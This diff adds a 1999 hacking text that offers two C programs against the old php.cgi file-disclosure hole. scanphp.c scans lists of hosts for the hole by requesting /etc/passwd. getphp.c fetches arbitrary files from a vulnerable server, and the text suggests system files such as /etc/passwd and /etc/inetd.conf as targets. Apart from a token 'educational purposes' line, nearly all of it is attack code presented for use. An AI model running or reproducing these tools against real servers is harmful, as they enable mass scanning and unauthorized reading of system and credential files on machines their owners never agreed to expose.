@@ -1,0 +1,173 @@
+============================================
+Servers Which Are PHP Vulnerable 
+============================================
+Author : Netw0rk Bug
+E-Mail : bug@netw0rk.freeserve.co.uk
+Date : MAY 1999
+============================================
+
+Here are a couple programs written in C, scanphp.c and getphp.c 
+These two programs use a hole in the php.cgi code that allows remote users to
+read any file on the system that the http daemon has access to.
+use scanphp.c to scan from a list of hosts, then getphp.c to
+retrieve files from the remote hosts.
+
+/*
+
+  scanphp.c : php.cgi     php vunerable server scanning program.
+  
+  A modified version of the phf scanner, by Alhambra of The Guild.
+  
+
+  Usage:
+        phpscan <infile> <outfile>
+
+*/
+
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <termios.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <sys/syslog.h>
+#include <sys/param.h>
+#include <sys/times.h>
+#ifdef LINUX
+#include <sys/time.h>
+#endif
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/signal.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+int FLAG = 1;
+int Call(int signo)
+{
+ FLAG = 0;
+}
+
+main (int argc, char *argv[])
+{
+  char host[100], buffer[1024], hosta[1024],FileBuf[8097];
+  int outsocket, serv_len, len,X,c,outfd;
+  struct hostent *nametocheck;
+  struct sockaddr_in serv_addr;
+  struct in_addr outgoing;
+
+  char PHPMessage[]="GET cgi-bin/php.cgi?/etc/passwd\n";
+
+  while(fgets(hosta,100,stdin))
+    {
+      if(hosta[0] == '\0')
+      break;
+      hosta[strlen(hosta) -1] = '\0';
+      write(1,hosta,strlen(hosta)*sizeof(char));
+      write(1,"\n",sizeof(char));
+      outsocket = socket (AF_INET, SOCK_STREAM, 0);
+      memset (&serv_addr, 0, sizeof (serv_addr));
+      serv_addr.sin_family = AF_INET;
+     
+      nametocheck = gethostbyname (hosta);
+
+      (void *) memcpy (&outgoing.s_addr,       nametocheck->h_addr_list[0],sizeof       (outgoing.s_addr));
+      strcpy (host, inet_ntoa (outgoing));
+      serv_addr.sin_addr.s_addr = inet_addr (host);
+      serv_addr.sin_port = htons (80);
+      signal(SIGALRM,Call);
+      FLAG = 1;
+
+      alarm(10);    
+
+      X=connect (outsocket, (struct sockaddr *)       &serv_addr, sizeof (serv_addr));
+      alarm(0);
+
+      if(FLAG == 1 && X==0){
+       write(outsocket,PHPMessage,strlen(PHPMessage)*sizeof(char));
+       while((X=read(outsocket,FileBuf,8096))!=0)         write(1,FileBuf,X);
+       }
+       close (outsocket);   
+    }
+  return 0;
+}
+
+
+
+
+
+Heres the getphp.c, be carefull with it.
+You might want to get such files as
+
+  /etc/passwd
+  /etc/services
+  /etc/syslogd.conf
+  /etc/inetd.conf
+
+/*
+
+  p1 (peewun@heterosexual.com)
+
+  This code retrieves a file using php.cgi on a remote system.
+  This program is for educational purposes only.  Use it on p1.com.
+
+*/
+
+#include <signal.h>
+#include <stdio.h>
+#include <sys/param.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdarg.h>
+#include <string.h>
+
+FILE    *server;
+int sock;
+
+void do_connect(char *host, char *toget);
+void do_connect(char *host, char *toget)
+{
+    char inbuf[1024];
+    struct sockaddr_in sin;
+    struct hostent *hp;
+    char *tmpbuf;
+
+    hp = gethostbyname(host);
+    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
+    sin.sin_family = hp->h_addrtype;
+    sin.sin_port = htons(80);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    if ( -1 < connect(sock, (struct sockaddr *) &sin, sizeof(sin)) ) {
+       printf("Made connection to %s.\n\n", host);
+    } else {
+       printf("Failed to connect to %s.\n\n",host);
+       exit(0);
+    }
+
+    server=fdopen(sock, "a+");
+    fprintf(server, "GET /cgi-bin/php.cgi?%s\n",toget);
+    printf("Output from php.cgi request:\n\n");
+    while(1){
+       if (fgets(inbuf, 1024, server) == NULL)
+          break;
+       printf(inbuf);
+    }
+
+}                       
+main(int argc,char **argv)
+{
+    printf("\nThis program retrieves files off a remote system using php.cgi.\n");
+    printf("Author: p1 - peewun@heterosexual.com\n");
+    if (argc < 3) {
+      printf("Usage: %s <domain> <path and file>\n",argv[0]);
+      printf("   Ex: %s www.p1.com /etc/passwd\n",argv[0]);
+    }
+    else {
+      char *buffer;
+      (char *)"exit";
+      do_connect(argv[1],argv[2]);
+      exit(1);
+    }
+}
